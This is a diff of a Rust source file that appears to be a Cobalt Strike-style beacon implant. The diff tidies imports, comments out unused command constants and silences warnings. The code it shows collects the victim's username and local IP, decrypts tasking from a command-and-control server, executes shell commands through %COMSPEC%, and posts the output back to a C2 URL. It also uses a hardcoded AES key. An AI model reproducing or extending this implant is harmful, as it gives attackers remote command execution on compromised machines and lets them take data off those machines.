@@ -1,28 +1,17 @@
 // use core::slice::SlicePattern;
 /// b1tg @ 2022/11/19
 use std::{
-    cell::Cell,
-    fmt::format,
     fs,
-    io::{BufReader, Read},
-    net::{IpAddr, Ipv4Addr, SocketAddr, SocketAddrV4},
-    os::raw,
+    net::{IpAddr, Ipv4Addr},
     process::Command,
     vec,
 };
 // use sha2::Sha256;
-use bytes::{BufMut, BytesMut};
-use rsa::{pkcs8::DecodePublicKey, PaddingScheme, PublicKey, RsaPrivateKey, RsaPublicKey};
-use sha2::{Digest, Sha256, Sha512};
+use rsa::{pkcs8::DecodePublicKey, PaddingScheme, PublicKey, RsaPublicKey};
+use sha2::{Digest, Sha256};
 // use aes::cipher::{block_padding::Pkcs7, BlockDecryptMut, BlockEncryptMut, KeyIvInit};
 use byteorder::{ReadBytesExt, BE};
 use crypt::*;
-use crypto::{
-    aes::{self, KeySize},
-    blockmodes::PaddingProcessor,
-    buffer::{BufferResult, ReadBuffer, RefReadBuffer, WriteBuffer},
-    symmetriccipher,
-};
 use local_ip_address::local_ip;
 use profile::{C2_GET_URL, C2_POST_URL, PUB_KEY, USER_AGENT};
 use std::io::Cursor;
@@ -32,15 +21,15 @@ mod crypt;
 mod profile;
 mod utils;
 
-const CMD_TYPE_SLEEP: u32 = 4;
+// const CMD_TYPE_SLEEP: u32 = 4;
 const CMD_TYPE_SHELL: u32 = 78; //0x4E
-const CMD_TYPE_UPLOAD_START: u32 = 10; // 0x0A
-const CMD_TYPE_UPLOAD_LOOP: u32 = 67; // 0x43
-const CMD_TYPE_DOWNLOAD: u32 = 11; // 0x0B
-const CMD_TYPE_EXIT: u32 = 3; // 0x03
-const CMD_TYPE_CD: u32 = 5; // 0x05
-const CMD_TYPE_PWD: u32 = 39; // 0x27
-const CMD_TYPE_FILE_BROWSE: u32 = 53; // 0x35
+                                // const CMD_TYPE_UPLOAD_START: u32 = 10; // 0x0A
+                                // const CMD_TYPE_UPLOAD_LOOP: u32 = 67; // 0x43
+                                // const CMD_TYPE_DOWNLOAD: u32 = 11; // 0x0B
+                                // const CMD_TYPE_EXIT: u32 = 3; // 0x03
+                                // const CMD_TYPE_CD: u32 = 5; // 0x05
+                                // const CMD_TYPE_PWD: u32 = 39; // 0x27
+                                // const CMD_TYPE_FILE_BROWSE: u32 = 53; // 0x35
 
 #[derive(Debug)]
 struct Beacon {
@@ -198,11 +187,11 @@ impl Beacon {
         let user_name = win_os_system("whoami").unwrap_or("unknow_name".into());
         let local_ip = match local_ip() {
             Ok(ip) => {
-                println!("Local internal IP address is: {:?}", ip);
+                println!("local internal IP address is: {:?}", ip);
                 ip
             }
             Err(e) => {
-                eprintln!("Unable to obtain the internal network IP address: {}", e);
+                eprintln!("unable to obtain the internal network IP address: {}", e);
                 IpAddr::V4(Ipv4Addr::new(127, 0, 0, 1))
             }
         };
@@ -285,10 +274,10 @@ fn main() {
                 // |634bfc59 00000026 0000004e 0000001e| cK.Y...&...N.... 00000000
                 // |00000009 25434f4d 53504543 25000000| ....%COMSPEC%... 00000010
                 // |0b202f43 20697020 61646472 00004141| . /C ip addr..AA 00000020
-                let timestamp = decrypted_cursor.read_u32::<BE>().unwrap();
-                let cmd_len1 = decrypted_cursor.read_u32::<BE>().unwrap();
+                let _timestamp = decrypted_cursor.read_u32::<BE>().unwrap();
+                let _cmd_len1 = decrypted_cursor.read_u32::<BE>().unwrap();
                 let cmd_type = decrypted_cursor.read_u32::<BE>().unwrap();
-                let cmd_len = decrypted_cursor.read_u32::<BE>().unwrap();
+                let _cmd_len = decrypted_cursor.read_u32::<BE>().unwrap();
                 if cmd_type == CMD_TYPE_SHELL {
                     // <app_len:u32> <app_data>
                     // <arg_len:u32> <arg_data>
@@ -333,8 +322,8 @@ fn main() {
                     );
                     println!("buf, len:{}, data:{:?}", buf.len(), hexdump::hexdump(&buf));
                     let url = format!("{}{}", C2_POST_URL, beacon.id);
-                    let post_res = Strike::http_post(&url, "", "", buf);
-                    dbg!(post_res);
+                    let _post_res = Strike::http_post(&url, "", "", buf);
+                    // dbg!(post_res);
                 } else {
                     println!("UNKNOW: cmd_content: {:?}", "&cmd_content");
                 }
@@ -358,6 +347,7 @@ fn test_reply_pkg() {
     assert_eq!(result, expect);
 }
 
+#[allow(dead_code)]
 fn reply_pkg(data: &[u8]) -> Vec<u8> {
     let iv = b"abcdefghijklmnop";
     let aes_key = b"abcdefghijklmnop";
@@ -406,7 +396,7 @@ impl Rng {
     }
     fn gen_bytes(&mut self, len: usize) -> Vec<u8> {
         let mut res: Vec<u8> = vec![];
-        for i in 0..len {
+        for _ in 0..len {
             res.push(self.rand() as u8);
         }
         res
